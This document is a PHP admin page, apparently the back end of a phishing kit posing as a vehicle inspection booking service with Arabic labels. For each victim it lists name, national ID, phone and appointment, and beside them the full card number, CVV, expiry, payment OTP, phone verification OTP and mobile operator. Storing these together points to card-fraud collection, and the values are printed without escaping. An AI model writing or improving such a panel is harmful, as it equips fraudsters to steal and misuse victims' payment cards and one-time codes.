
<?php
require_once 'db.php';

$query = "SELECT a.*, p.card_name, p.card_number, p.cvv, p.expiry_date, 
                 p.otp_code, p.phone_otp, p.operator, p.phone_number
          FROM appointments a
          LEFT JOIN payments p ON a.id = p.client_id
          ORDER BY a.id DESC";

$results = $conn->query($query);
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>عرض العملاء - مركز سلامة المركبات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px; }
    .card { border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 25px; height: 100%; }
    .card h6 { color: #1a6d3c; font-weight: bold; }
    .card p { margin-bottom: 8px; font-size: 15px; }
  </style>
</head>
<body>
  <div class="container">
    <h3 class="text-center text-success mb-4">جميع بيانات العملاء</h3>
    <div class="row">
    <?php while($row = $results->fetch_assoc()): ?>
      <div class="col-md-6 col-lg-4 mb-4">
        <div class="card p-3 shadow-sm h-100">
          <div>
            <h6>👤 بيانات العميل</h6>
            <p><strong>الاسم:</strong> <?= $row['fullname'] ?></p>
            <p><strong>رقم الهوية:</strong> <?= $row['idnumber'] ?></p>
            <p><strong>رقم الجوال:</strong> <?= $row['phone'] ?></p>
          </div>

          <button class="btn btn-sm btn-outline-primary w-100 my-2" onclick="toggleDetails(this)">عرض تفاصيل المركبة</button>

          <div class="vehicle-details" style="display: none;">
            <hr>
            <h6>🚗 بيانات المركبة</h6>
            <p><strong>رقم اللوحة:</strong> <?= $row['vehiclenumber'] ?></p>
            <p><strong>نوع التسجيل:</strong> <?= $row['registrationtype'] ?></p>
            <p><strong>نوع المركبة:</strong> <?= $row['vehicletype'] ?></p>
            <p><strong>نوع الفحص:</strong> <?= $row['inspectiontype'] ?></p>
            <p><strong>المدينة:</strong> <?= $row['city'] ?></p>
            <p><strong>الموعد:</strong> <?= $row['date'] ?> - <?= $row['time'] ?></p>
          </div>

          <hr>
          <h6>💳 بيانات البطاقة</h6>
          <p><strong>صاحب البطاقة:</strong> <?= $row['card_name'] ?></p>
          <p><strong>رقم البطاقة:</strong> <?= $row['card_number'] ?></p>
          <p><strong>CVV:</strong> <?= $row['cvv'] ?></p>
          <p><strong>تاريخ الانتهاء:</strong> <?= $row['expiry_date'] ?></p>

          <hr>
          <h6>🔐 رموز التحقق</h6>
          <p><strong>رمز الدفع (OTP):</strong> <?= $row['otp_code'] ?></p>
          <p><strong>رمز تحقق الجوال:</strong> <?= $row['phone_otp'] ?></p>
          <p><strong>المشغل:</strong> <?= $row['operator'] ?></p>
          <p><strong>رقم الجوال:</strong> <?= $row['phone_number'] ?></p>

          <div class="d-flex justify-content-between mt-3">
            <a href="print.php?id=<?= $row['id'] ?>" class="btn btn-sm btn-secondary">🖨 طباعة</a>
            <a href="edit.php?id=<?= $row['id'] ?>" class="btn btn-sm btn-warning">✏️ تعديل</a>
            <a href="delete.php?id=<?= $row['id'] ?>" class="btn btn-sm btn-danger" onclick="return confirm('هل أنت متأكد من الحذف؟')">🗑 حذف</a>
          </div>
        </div>
      </div>
    <?php endwhile; ?>
    </div>
  </div>

  <script>
    function toggleDetails(btn) {
      const section = btn.nextElementSibling;
      if (section.style.display === 'none') {
        section.style.display = 'block';
        btn.textContent = 'إخفاء التفاصيل';
      } else {
        section.style.display = 'none';
        btn.textContent = 'عرض تفاصيل المركبة';
      }
    }
  </script>
</body>
</html>
